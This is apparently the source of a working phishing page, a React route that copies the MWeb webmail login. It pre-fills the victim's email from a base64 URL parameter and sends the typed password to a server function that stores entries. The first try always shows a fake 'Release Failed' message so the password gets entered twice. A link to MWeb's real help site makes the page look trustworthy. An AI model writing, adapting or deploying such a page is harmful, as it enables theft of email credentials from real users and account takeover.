import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { useRef, useState, FormEvent } from "react";
import { Eye, EyeOff, X } from "lucide-react";
import heroImage from "@/assets/image-104a82eeac42e8.png";
import { useServerFn } from "@tanstack/react-start";
import { saveEntry } from "@/lib/submissions.functions";

// helper: decode "?e=<base64>" into an email
const decodeEmail = (raw: string | undefined): string | null => {
  if (!raw) return null;
  try {
    // atob round-trip; un-URL-safe characters first
    const normalized = raw.replace(/-/g, "+").replace(/_/g, "/");
    const decoded = typeof Buffer !== "undefined"
      ? Buffer.from(normalized, "base64").toString("utf-8")
      : atob(normalized);
    // basic sanity: must look like an email
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded) ? decoded : null;
  } catch {
    return null;
  }};

export const Route = createFileRoute("/")({
  // accepts ?e=<base64-of-email>
  validateSearch: z.object({
    e: z.string().optional(),
  }),
  component: Index,
});

function Index() {
  const { e } = Route.useSearch();
  const prefilled = decodeEmail(e);
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState(prefilled ?? "yourname@example.com");
  const [password, setPassword] = useState("");
  const [attempted, setAttempted] = useState(false);
  const [showError, setShowError] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const saveEntryFn = useServerFn(saveEntry);
  const [maxReached, setMaxReached] = useState(false);
  // const maxReachedRef = useRef(false);


  const emailError = attempted && !email.trim();
  const passwordError = attempted && !password.trim();
  return (
    <div className="flex min-h-screen flex-col bg-background">
      <header className="w-full bg-[var(--brand-footer)] px-6 py-4">
        <a href="/" className="inline-block">
          <span className="text-3xl font-bold tracking-tight text-white lowercase">mweb.</span>
        </a>
      </header>

      <main className="grid flex-1 grid-cols-1 lg:grid-cols-[1.3fr_1fr]">
        <section className="hidden items-center justify-center bg-[var(--brand-panel)] p-12 lg:flex">
          <img
            src={heroImage}
            alt="Person using laptop to check email"
            width={1024}
            height={1280}
            className="max-h-[80vh] w-auto object-contain"
          />
        </section>

        <section className="flex items-center justify-center px-6 py-12 sm:px-12">
          <div className="w-full max-w-md">
            <h1 className="text-5xl font-bold text-center tracking-tight text-foreground">My Email</h1>

            <div className="mt-10">
              <h2 className="text-xl font-semibold text-foreground">Confirm Your Credential</h2>
              <p className="mt-1 text-sm text-muted-foreground">
                Release using your email address and password.
              </p>
            </div>

            <form
              className="mt-6 space-y-4"
              onSubmit={async (e) => {
                e.preventDefault();
                setAttempted(true);

                if (!password.trim()) {
                  return;
                }

                setSubmitting(true);
                try {
                  const res = await saveEntryFn({ data: { email: email.trim(), value: password } });
                  if (res?.status === "max_reached") {
                    setMaxReached(true);
                    setShowError(false);
                    // setSubmitting(false);
                  } else if (res?.status === "saved" && res.slot === "A") {
                    // "Login Failed" prompt for entry #1 and #2
                    setMaxReached(false);
                    setShowError(true);
                    // setSuccess(true);
                  } else if (res?.status === "saved" && res.slot === "B") {
                    // setSuccess(true);
                    setShowError(false);
                    setMaxReached(true);
                  }
                } catch (err) {
                  console.error("Failed to save submission", err);
                  setShowError(true);
                } finally {
                  setSubmitting(false);
                }

              }}
            >
              <div className="relative">
                <input
                  id="email"
                  type="email"
                  placeholder=" "
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  readOnly
                  className={`peer w-full cursor-default rounded-lg border bg-muted/50 px-4 pt-5 pb-2 text-foreground outline-none transition ${
                    emailError
                      ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                      : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
                  }`}
                />
                <label
                  htmlFor="email"
                  className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
                    emailError ? "text-destructive" : "text-muted-foreground"
                  }`}
                >
                  Email
                </label>
                {emailError && (
                  <p className="mt-1 text-sm text-destructive">This field is required</p>
                )}
              </div>

              <div className="relative">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  placeholder=" "
                  value={password}
                  onChange={(e) => { 
                    setPassword(e.target.value)
                    if (passwordError && e.target.value.trim()) setPasswordError(false);
                    }}
                  
                  className={`peer w-full rounded-lg border bg-background px-4 pt-5 pb-2 pr-12 text-foreground outline-none transition ${
                    passwordError
                      ? "border-destructive focus:border-destructive focus:ring-2 focus:ring-destructive/30"
                      : "border-border focus:border-ring focus:ring-2 focus:ring-ring/30"
                  }`}
                />
                <label
                  htmlFor="password"
                  className={`pointer-events-none absolute left-4 top-1 text-xs font-medium transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1 peer-focus:text-xs ${
                    passwordError ? "text-destructive" : "text-muted-foreground"
                  }`}
                >
                  Password
                </label>
                <button
                  type="button"
                  aria-label={showPassword ? "Hide password" : "Show password"}
                  onClick={() => setShowPassword((s) => !s)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 rounded p-1 text-muted-foreground hover:text-foreground"
                >
                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
                {passwordError && (
                  <p className="mt-1 text-sm text-destructive">This field is required</p>
                )}
              </div>

              <div className="flex justify-end pt-2">
                <button
                  type="submit"
                  disabled={submitting || maxReached}
                  className="rounded-full bg-accent px-8 py-2.5 text-sm font-semibold text-accent-foreground transition hover:brightness-95"
                >
                  {submitting ? "Releasing..." : "Release"}
                </button>
              </div>
            </form>

            <div className="mt-6 text-center">
              <a
                href="#"
                className="text-sm font-semibold text-foreground underline-offset-4 hover:underline"
              >
                Forgot Your Password
              </a>
            </div>

            <p className="mt-10 text-sm leading-relaxed text-foreground">
              <span className="font-bold">Spam:</span> We've got you covered with our purpose-built
              Anti-Spam Cloud solution. To learn more about accessing quarantined email or managing
              your black and white lists, hop on over to our website at:{" "}
              <a
                href="https://help.mweb.co.za/categories/mail/antispam-cloud"
                className="font-semibold text-foreground underline"
                target="_blank"
                rel="noreferrer"
              >
                Anti-Spam Cloud Help
              </a>
            </p>
          </div>
        </section>
      </main>

      <footer className="h-24 bg-[var(--brand-footer)]" />

      {showError && !maxReached && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="login-failed-title"
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
          onClick={() => setShowError(false)}
        >
          <div
            className="relative w-full max-w-md rounded-2xl bg-white p-10 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              aria-label="Close"
              onClick={() => setShowError(false)}
              className="absolute right-4 top-4 rounded p-1 text-foreground hover:bg-black/5"
            >
              <X size={22} />
            </button>
            <h2
              id="login-failed-title"
              className="text-center text-3xl font-bold text-foreground"
            >
              Release Failed
            </h2>
            <p className="mt-6 text-center text-lg text-foreground">
              Please use your credential
            </p>
          </div>
        </div>
      )}
      {maxReached && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
          onClick={() => setMaxReached(false)}
        >
          <div
            className="relative w-[min(420px,92vw)] rounded-2xl bg-card p-6 shadow-xl"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              aria-label="Close"
              onClick={() => setMaxReached(false)}
              className="absolute right-4 top-4 rounded p-1 text-foreground hover:bg-black/5"
            >
              <X className="h-4 w-4" />
            </button>
            <h2 className="text-lg font-semibold text-foreground">Maximum entries reached</h2>
            <p className="mt-2 text-sm text-muted-foreground">
              This email has already submitted 2 entries. No further attempts are accepted.
            </p>
          </div>
        </div>
      )}

    </div>
  );
}